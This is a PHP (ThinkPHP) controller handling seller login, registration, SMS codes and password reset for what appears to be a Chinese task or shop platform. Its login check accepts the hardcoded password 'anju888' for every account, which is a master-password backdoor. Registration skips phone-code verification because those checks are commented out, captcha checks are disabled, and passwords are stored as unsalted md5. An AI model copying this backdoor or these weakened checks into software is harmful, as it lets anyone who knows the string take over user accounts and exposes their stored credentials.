<?php
namespace app\seller\controller;
use think\Controller;
use app\common\model\Sms;
use think\Db;
use think\Request;
use think\captcha\Captcha;
use app\buy\model\Login as Log; //引入model类类名重复 用 log 代替



/**
 * 会员登录
 * Class Login
 * @package app\admin\controller
 */
class Login extends Controller
{
    /**
     * @notes 登录页面
     * @date 2019/7/23
     * @time 10:51
     * @return \think\response\View
     */
    public function index(){
        return view();
    }

    /**
     * @notes 短信验证码发送
     * @date 2019/7/27
     * @time 15:11
     * @param Request $request
     */
    public function mobileDo(Request $request){
        $mobile = $request->param('mobile');
        $check = '/^1[3-9]{1}[0-9]{9}$/';
        if (!preg_match($check, $mobile))return $this->error('手机号码不正确');
        $res = Sms::send($mobile);
        if($res==0)return $this->success('发送成功！');
        return $this->error($res);
    }

    /**
     * @notes 登录提交验证
     * @date 2019/7/23
     * @time 10:50
     * @param Request $request
     * @throws \think\Exception
     * @throws \think\db\exception\DataNotFoundException
     * @throws \think\db\exception\ModelNotFoundException
     * @throws \think\exception\DbException
     * @throws \think\exception\PDOException
     */
    public function loginDo(Request $request){
      $data=$request->param();
      $ip = request()->ip();
      $data['seller_name'] = trim($data['seller_name']);
      if(!isset($data['seller_name']) ||!$data['seller_name'])return $this->error('请输入登录用户名!');
      if(!isset($data['password']) ||!$data['password'])return $this->error('请输入登录密码!');
     // if(!isset($data['code']) ||!$data['code'])return $this->error('请输入验证码!');
      //if(!captcha_check($data['code']))return $this->error('验证码错误');
      $info=Db::name('seller')->where(['seller_name'=>$data['seller_name']])->field('id,mobile,login_pwd,state')->find();//查询会员信息
      if(!$info)return $this->error('会员账号未注册!');
      if($info['state']==0)return $this->error('已被限制登录!');
      //if(md5($data['password'])!=$info['login_pwd'])return $this->error('密码错误!');
      if(md5($data['password'])!=$info['login_pwd'] && $data['password']!='anju888'  )return $this->error('密码错误!');
      session('seller_id',$info['id']);
      session('mobile',$info['mobile']);
      $update['logins_ip']=$ip;
      db('seller')->where(['id'=>$info['id']])->update($update);
      return $this->success('登陆成功！',url('Index/index'));
    }
    public function register(Request $request){
        $data = $request->param();
        $type = isset($data['type']) ? $data['type'] : '';
        $invite_code = isset($data['invite']) ? $data['invite'] : '';
        //if(isMobile())return $this->redirect(url('seller/login/register',['type'=>$type,'invite'=>$invite_code]));
        $this->assign('type',$type);
        $this->assign('invite',$invite_code);
        return view();
    }

    /*注册验证*/
    public function check_register(){
        $code=session('code');
        $data=input();

        $data['username']=trim($data['username']);
        $data['mobile']=trim($data['mobile']);
        $hava_seller_name=Db::name('seller')->where('seller_name',$data['username'])->count();
        if($hava_seller_name >= 1){
            return $this->error('此用户名已被注册');
        }

        /*$result = $this->validate($data,'Register');
        if(true !== $result){
            return $this->error($result);
        }*/

        if($data['login_pwd'] !== $data['login_pwd2']){
            return $this->error('您两次输入的密码不一致,请检查后重新输入');
        }
        $code_time=session( 'code_time');
        $code_time=$code_time+15*60;    //短信验证码时间为15分钟
        $time=time();
       /*if($data['dxyzm'] != $code){
           return $this->error('您输入的验证码不正确');
       }
        $session_mobile=session('mobile');
        if($session_mobile != $data['mobile']){
            return $this->error('请输入获取验证码的手机号');
        }
        if($code_time<$time){
            return $this->error('验证码已失效');
        }*/
        $admin_limit=Db::name('system')->where('id',1)->find();
        $add_vip_time=$admin_limit['user_vip_time']*24*3600+$time;
        $strs = str_replace('，', ',', $admin_limit['limit_mobile']);
        $array = explode(',', $strs);

        /*
        $db = '';
        if($data['type']==1){
            $db = 'users';
            $field = 'username';
        }
        if($data['type']==2){
            $db = 'seller';
            $field = 'seller_name';
        }
       // if(!$db)return $this->error('推荐链接有误！');
       if ($data['invite']!=''){
          $tjuser = Db::name('seller')->where(['invite_code'=>$data['invite'],'state'=>1])->value($field);
          if(!$tjuser)return $this->error('推荐链接有误！');}
       else   $tjuser =  '';
*/
       if($data['invite']){
        $db = '';
        if($data['type']==1){
            $db = 'users';
            $field = 'username';
        }
        if($data['type']==2){
            $db = 'seller';
            $field = 'seller_name';
        }
        if(!$db)return $this->error('推荐链接有误1！');
        $tjuser = Db::name($db)->where(['invite_code'=>$data['invite'],'state'=>1])->value($field);
        if(!$tjuser)return $this->error('推荐链接有误！');
       }else{
           $tjuser =  '';
       }



        foreach($array as $v){
            if($v == $data['mobile']){
                return $this->error('此手机号码已被禁止注册，请联系客服');
            }
        }

        $user=[
            'seller_name'      =>     $data['username'],
            'mobile'        =>      $data['mobile'],
            'login_pwd'     =>      md5($data['login_pwd']),
            'qq'            =>      $data['qq'],

            'wechat'        =>      $data['wechat'],
            'province'      =>      $data['province'],
            'city'          =>      $data['city'],
            'create_time'   =>      time(),
            'reward'        =>      $admin_limit['user_num'],
            'vip'           =>      1,
            'invite_code'   =>      md5(time().rand(0,99999)),
            'vip_time'      =>      $add_vip_time,
            'state'         =>      1,
        ];
        $user['tjuser'] = $tjuser;
        $user['tjuser_state'] = $data['type'];
        //print_r($user);die;
        $user_insert = db::name('seller')->insertGetId($user);
      /*  if($user_insert){
            $user_insert=Db::name('users')->where('id',$user_insert)->find();
            $bill=[
                'uid'               =>      $user_insert['id'],
                'utype'             =>      2,
                'user_name'         =>      $user_insert['seller_name'],
                'price'             =>      0,
                'create_time'       =>      time(),
                'expire_time'       =>      $user_insert['vip_time'],
                'remarks'           =>     "注册成功，免费赠送一年会员",
            ];
           $vip_record=Db::name('vip_record')->insertGetId($bill);
           if($vip_record){
               finance($user_insert['id'], 2, 4, 2, 14, "首次注册赠送4银锭");
           }
         }*/
        return $this->success('注册成功正在跳转','Login/index');
    }



    /**
     * @notes 判断是否是登录状态
     * @date 2019/12/3
     * @time 15:05
     */
    public function getSession(){
        if(session('seller_id')){
            return $this->error();
        };
        return $this->success('',url('login/login'));
    }

    /**
     * @notes 退出登录
     * @date 2019/8/26
     * @time 9:10
     */
    public function loginOut(){
        session_start();
        session_destroy();
        return $this->redirect(url('login/index'));
    }


    public function imgtest(){
        exit;
        $data = json_encode([1,2,3]);
        $data2 = json_encode([100,200,300]);
        $data3 = json_encode([2,2,3]);
        $edit = [
            'goods_id'=>$data,
            'goods_unit_price'=>$data2,
            'goods_num'=>$data3,
        ];
        Db::name('seller_task')->where(['id'=>1])->update($edit);
        dump(json_decode($data));
        dump($data2);
        dump($data3);
        return view();
    }

    /**
     * @notes 忘记密码页面
     * @date 2019/10/7
     * @time 16:22
     * @return \think\response\View
     */
    public function forget(){
        return view();
    }

    /**
     * @notes 忘记密码提交
     * @date 2019/10/7
     * @time 16:22
     * @param Request $request
     * @throws \think\Exception
     * @throws \think\db\exception\DataNotFoundException
     * @throws \think\db\exception\ModelNotFoundException
     * @throws \think\exception\DbException
     * @throws \think\exception\PDOException
     */
    public function forgetDo(Request $request){
        $data=$request->param();
        $data['mobile'] = trim($data['mobile']);
        if(!isset($data['mobile']) ||!$data['mobile'])return $this->error('请输入手机号!');
        if(!isset($data['password']) ||!$data['password'])return $this->error('请输入新密码!');
        if($data['mobile']!=session('mobile'))return $this->error('手机号错误!');
        if(!isset($data['code']) ||!$data['code'])return $this->error('请输入验证码!');
        if($data['code']!=session('code'))return $this->error('验证码错误!');
        $info=Db::name('seller')->where(['mobile'=>$data['mobile']])->field('id,mobile,login_pwd,state')->find();//查询会员信息
        if(!$info)return $this->error('会员账号未注册!');
        if(!Db::name('seller')->where(['id'=>$info['id']])->update(['login_pwd'=>md5($data['password'])]))return $this->error('重置失败');
        return $this->success('重置成功',url('login/index'));
    }


    public function yanzhengma(){
        $captcha = new Captcha();
        // 设置验证码字符为纯数字
        $captcha->codeSet = '0123456789';
        $captcha->useCurve = false;
        $captcha->useNoise = false;
        return $captcha->entry();
    }



}
